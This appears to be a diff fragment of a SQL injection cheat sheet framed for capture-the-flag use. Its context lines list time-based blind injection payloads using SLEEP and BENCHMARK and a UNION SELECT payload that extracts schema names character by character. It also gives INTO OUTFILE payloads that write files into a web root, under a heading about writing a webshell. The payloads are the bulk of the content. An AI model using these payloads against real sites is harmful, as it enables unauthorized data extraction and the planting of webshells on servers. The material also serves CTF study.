@@ -235,7 +235,9 @@ payload
 ...
 
 script
+
 Script use, visible: ctf blind using script points:
+
 Pay attention to the coding problem
 Pay attention to the exception handling
 Pay attention to the border processing
@@ -243,6 +245,7 @@ Delayed blinds - based on time
 Generally use a few functions. The effect of using these is to delay the operation of mysql, and thus detect the situation with the usual difference:
 SLEEP (n) to stop mysql n seconds
 BENCHMARK (count, expr) Repeats the countTimes occurrence of the expression expr
+
 Some notes:
 The use of time-based blinds is not as accurate as it depends on the current network environment.
 Time delay is best not to exceed 30 seconds, otherwise easily lead to mysql API connection timeout.
@@ -254,6 +257,7 @@ Detection method
 ') OR SLEEP(25)=0 LIMIT 1 #
 1)) OR SLEEP(25)=0 LIMIT 1 #
 SELECT SLEEP(25) #
+
 payload
 
 UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j,BENCHMARK(100000,SHA1(1)),0)
@@ -311,6 +315,7 @@ payload
 UNION SELECT DATABASE() INTO OUTFILE 'C:\\phpstudy\\WWW\\test\\1';
 
 UNION SELECT DATABASE() INTO OUTFILE 'C:/phpstudy/WWW/test/1';
+
 Write webshell
 condition
 Need to know the site's absolute physical path, so after export webshell can be accessed
